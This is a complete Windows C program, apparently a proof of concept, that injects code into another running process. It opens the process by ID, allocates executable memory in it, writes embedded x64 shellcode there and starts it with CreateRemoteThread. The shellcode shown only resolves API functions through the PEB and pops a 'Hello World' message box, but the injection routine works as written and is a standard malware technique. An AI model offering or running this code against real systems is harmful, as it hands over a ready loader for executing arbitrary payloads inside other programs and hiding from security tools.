#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	
	if (argc == 1) {
		printf("Usage: ProcessInjection <pid>");
		return 0;
	}
	
	HANDLE processHandle;
	HANDLE threadHandle;
	PVOID remoteBuffer;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, 2000, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer,
		"\xB8\x08\x00\x00\x00\x48\x21\xE0\x74\x2C\x48\x83\xEC\x08\xEB\x26"
		"\x52\x51\x56\x57\x48\x31\xC0\x8A\x01\x8A\x22\x84\xC0\x74\x12\x84"
		"\xE4\x74\x0E\x28\xE0\x30\xE4\x48\xFF\xC1\x48\xFF\xC2\x84\xC0\x74"
		"\xE3\x5F\x5E\x59\x5A\xC3\x48\x81\xEC\x00\x04\x00\x00\x65\x48\x8B"
		"\x04\x25\x30\x00\x00\x00\x3E\x48\x8B\x40\x60\x48\x8B\x40\x18\x48"
		"\x8B\x40\x10\x48\x8B\x00\x48\x8B\x00\x48\x8B\x40\x30\x48\x89\x84"
		"\x24\x00\x04\x00\x00\x48\x8B\x9C\x24\x00\x04\x00\x00\x48\x31\xC0"
		"\x8A\x43\x3C\x48\x01\xC3\x48\x83\xC3\x04\x48\x83\xC3\x14\x48\x83"
		"\xC3\x70\x48\x31\xC0\x8B\x03\x48\x03\x84\x24\x00\x04\x00\x00\x48"
		"\x89\x84\x24\xF8\x03\x00\x00\x48\x8B\x9C\x24\xF8\x03\x00\x00\x48"
		"\x31\xFF\x8B\x7B\x1C\x48\x03\xBC\x24\x00\x04\x00\x00\x48\x89\xBC"
		"\x24\xF0\x03\x00\x00\x48\x31\xF6\x8B\x73\x20\x48\x03\xB4\x24\x00"
		"\x04\x00\x00\x48\x31\xFF\x8B\x7B\x24\x48\x03\xBC\x24\x00\x04\x00"
		"\x00\x48\x31\xC0\x48\x89\x04\x24\x48\x31\xC9\x8B\x0E\x48\x03\x8C"
		"\x24\x00\x04\x00\x00\xB8\x61\x72\x79\x41\x48\x89\x84\x24\x00\x02"
		"\x00\x00\x48\xB8\x4C\x6F\x61\x64\x4C\x69\x62\x72\x48\x89\x84\x24"
		"\xF8\x01\x00\x00\x48\x8D\x94\x24\xF8\x01\x00\x00\xE8\xFF\xFE\xFF"
		"\xFF\x48\x85\xC0\x75\x34\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04"
		"\x24\x48\x31\xC0\x66\x8B\x07\x48\xC1\xE0\x02\x48\x03\x84\x24\xF0"
		"\x03\x00\x00\x48\x31\xDB\x8B\x18\x48\x03\x9C\x24\x00\x04\x00\x00"
		"\x48\x89\x9C\x24\xE8\x03\x00\x00\xEB\x75\x48\x31\xC9\x8B\x0E\x48"
		"\x03\x8C\x24\x00\x04\x00\x00\x48\xB8\x64\x64\x72\x65\x73\x73\x00"
		"\x00\x48\x89\x84\x24\x00\x02\x00\x00\x48\xB8\x47\x65\x74\x50\x72"
		"\x6F\x63\x41\x48\x89\x84\x24\xF8\x01\x00\x00\x48\x8D\x94\x24\xF8"
		"\x01\x00\x00\xE8\x88\xFE\xFF\xFF\x48\x85\xC0\x75\x32\x48\x8B\x04"
		"\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x31\xC0\x66\x8B\x07\x48\xC1"
		"\xE0\x02\x48\x03\x84\x24\xF0\x03\x00\x00\x48\x31\xDB\x8B\x18\x48"
		"\x03\x9C\x24\x00\x04\x00\x00\x48\x89\x9C\x24\xE0\x03\x00\x00\x48"
		"\x8B\x04\x24\x48\x83\xC6\x04\x48\x83\xC7\x02\x48\x83\xF8\x02\x0F"
		"\x8C\x03\xFF\xFF\xFF\xB8\x6C\x6C\x00\x00\x48\x89\x84\x24\x00\x02"
		"\x00\x00\x48\xB8\x55\x73\x65\x72\x33\x32\x2E\x64\x48\x89\x84\x24"
		"\xF8\x01\x00\x00\x48\x8D\x8C\x24\xF8\x01\x00\x00\x48\x8B\x84\x24"
		"\xE8\x03\x00\x00\xFF\xD0\x48\x89\xC1\xB8\x6F\x78\x41\x00\x48\x89"
		"\x84\x24\x00\x02\x00\x00\x48\xB8\x4D\x65\x73\x73\x61\x67\x65\x42"
		"\x48\x89\x84\x24\xF8\x01\x00\x00\x48\x8D\x94\x24\xF8\x01\x00\x00"
		"\x48\x8B\x84\x24\xE0\x03\x00\x00\xFF\xD0\x48\x89\x84\x24\xD8\x03"
		"\x00\x00\xB8\x6C\x00\x00\x00\x48\x89\x84\x24\x00\x02\x00\x00\x48"
		"\xB8\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x48\x89\x84\x24\xF8\x01\x00"
		"\x00\x48\x8D\x8C\x24\xF8\x01\x00\x00\x48\x8B\x84\x24\xE8\x03\x00"
		"\x00\xFF\xD0\x48\x89\xC1\xB8\x64\x00\x00\x00\x48\x89\x84\x24\x00"
		"\x02\x00\x00\x48\xB8\x73\x65\x72\x54\x68\x72\x65\x61\x48\x89\x84"
		"\x24\xF8\x01\x00\x00\x48\xB8\x52\x74\x6C\x45\x78\x69\x74\x55\x48"
		"\x89\x84\x24\xF0\x01\x00\x00\x48\x8D\x94\x24\xF0\x01\x00\x00\x48"
		"\x8B\x84\x24\xE0\x03\x00\x00\xFF\xD0\x48\x89\x84\x24\xD0\x03\x00"
		"\x00\x48\x31\xC0\x48\x89\xC1\xB8\x72\x6C\x64\x00\x48\x89\x84\x24"
		"\x00\x02\x00\x00\x48\xB8\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x48\x89"
		"\x84\x24\xF8\x01\x00\x00\x48\x8D\x94\x24\xF8\x01\x00\x00\x48\xB8"
		"\x43\x61\x70\x74\x69\x6F\x6E\x00\x48\x89\x84\x24\xF0\x01\x00\x00"
		"\x4C\x8D\x84\x24\xF0\x01\x00\x00\x48\x31\xC0\x49\x89\xC1\x48\x8B"
		"\x84\x24\xD8\x03\x00\x00\xFF\xD0\xB8\x00\x00\x00\x00\x48\x89\xC1"
		"\x48\x8B\x84\x24\xD0\x03\x00\x00\xFF\xD0",
		812, NULL);
	threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	return 0;
	
}